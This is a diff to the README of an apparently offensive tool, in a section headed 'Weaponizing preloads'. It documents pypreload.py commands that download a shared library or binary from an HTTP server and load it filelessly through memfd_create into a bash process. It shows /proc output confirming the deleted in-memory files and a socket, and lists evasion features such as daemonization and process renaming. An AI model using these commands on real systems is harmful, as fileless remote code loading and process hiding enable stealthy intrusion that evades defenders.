@@ -599,7 +599,52 @@ Building with more featured cp ../../ports/unix/mpconfigport.h mpconfigport.h
 ### Weaponizing preloads
 - load via memfd_create: src/pypreload.py
 
-    `python src/pypreload.py /bin/bash `pwd`/bin/main_init`
+
+
+
+SO preload
+`./pypreload.py  -t so -l http://127.0.0.1:8080/libmctor.so -d bash -c /root/Code/zombieant/src/main`
+
+```
+root@kali:~/Code/zombieant# ls -l /proc/56417/fd
+total 0
+lrwx------ 1 root root 64 Feb 17 17:55 0 -> /dev/pts/6
+lrwx------ 1 root root 64 Feb 17 17:55 1 -> /dev/pts/6
+lrwx------ 1 root root 64 Feb 17 17:55 2 -> /dev/pts/6
+lrwx------ 1 root root 64 Feb 17 17:54 3 -> '/memfd:K2J5S6N4 (deleted)'
+lr-x------ 1 root root 64 Feb 17 17:55 4 -> /dev/urandom
+lr-x------ 1 root root 64 Feb 17 17:55 5 -> 'pipe:[3478476]'
+lr-x------ 1 root root 64 Feb 17 17:55 7 -> 'pipe:[3478477]'
+root@kali:~/Code/zombieant# ls -l /proc/56418/fd
+total 0
+lrwx------ 1 root root 64 Feb 17 17:55 0 -> /dev/pts/6
+l-wx------ 1 root root 64 Feb 17 17:55 1 -> 'pipe:[3478476]'
+l-wx------ 1 root root 64 Feb 17 17:55 2 -> 'pipe:[3478477]'
+
+```
+```
+56417 pts/6    S+     0:00                  |   |   |   \_ bash                                                                             
+56418 pts/6    S+     0:00                  |   |   |       \_ /root/Code/zombieant/src/main WINDOWID=33675758 MATE_DESKTOP_SESSION_ID=this-i
+1
+```
+
+BIN exec:
+
+`./pypreload.py  -t bin -l http://127.0.0.1:8080/zaf -d bash`
+parent gone (pypreload), zaf loaded
+
+```
+ls -l /proc/56509/fd/
+total 0
+lr-x------ 1 root root 64 Feb 17 18:08 0 -> /dev/null
+l-wx------ 1 root root 64 Feb 17 18:08 1 -> /dev/null
+lrwx------ 1 root root 64 Feb 17 18:08 2 -> /dev/null
+l-wx------ 1 root root 64 Feb 17 18:08 3 -> /tmp/_mf.log
+lrwx------ 1 root root 64 Feb 17 18:08 4 -> '/memfd:fa37Jn (deleted)'
+lrwx------ 1 root root 64 Feb 17 18:08 5 -> 'socket:[3479923]'
+
+```
+
 
 - psevade daemonization, process renaming
 - LD_ args
